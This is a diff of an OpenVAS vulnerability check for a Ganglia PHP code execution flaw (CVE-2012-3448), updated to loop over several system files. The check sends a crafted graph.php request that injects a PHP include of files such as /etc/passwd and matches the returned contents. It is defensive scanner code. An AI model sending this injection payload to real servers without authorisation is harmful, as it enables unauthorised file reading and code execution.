@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ganglia_54699.nasl 11049 2018-08-20 08:53:50Z asteins $
+# $Id: gb_ganglia_54699.nasl 11647 2018-09-27 09:31:07Z jschulte $
 #
 # Ganglia PHP Code Execution Vulnerability
 #
@@ -34,7 +34,7 @@ if (description)
   script_cve_id("CVE-2012-3448");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11049 $");
+  script_version("$Revision: 11647 $");
 
   script_name("Ganglia PHP Code Execution Vulnerability");
 
@@ -42,40 +42,50 @@ if (description)
   script_xref(name:"URL", value:"http://ganglia.sourceforge.net/");
   script_xref(name:"URL", value:"http://console-cowboys.blogspot.de/2012/07/extending-your-ganglia-install-with.html");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-20 10:53:50 +0200 (Mon, 20 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-27 11:31:07 +0200 (Thu, 27 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-08-13 12:40:50 +0200 (Mon, 13 Aug 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
-  script_dependencies("gb_ganglia_detect.nasl");
+  script_dependencies("gb_ganglia_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("ganglia/installed");
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_tag(name:"summary", value:"Ganglia is prone to a vulnerability that lets remote attackers execute
-arbitrary code.");
+  arbitrary code.");
   script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary PHP code within
-the context of the affected web server process.");
+  the context of the affected web server process.");
   script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
-information.");
+  information.");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
-url = dir + '/graph.php?g=cpu_report,include+%27/etc/passwd%27';
+files = traversal_files();
 
-if(http_vuln_check(port:port, url:url,pattern:"root:x:0:[01]:.*")) {
-  security_message(port:port);
-  exit(0);
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  url = dir + '/graph.php?g=cpu_report,include+%27/' + file + '%27';
+
+  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
+    report = report_vuln_url(url:url);
+    security_message(data:report, port:port);
+    exit(0);
+  }
 }
 
-exit(0);
+exit(99);
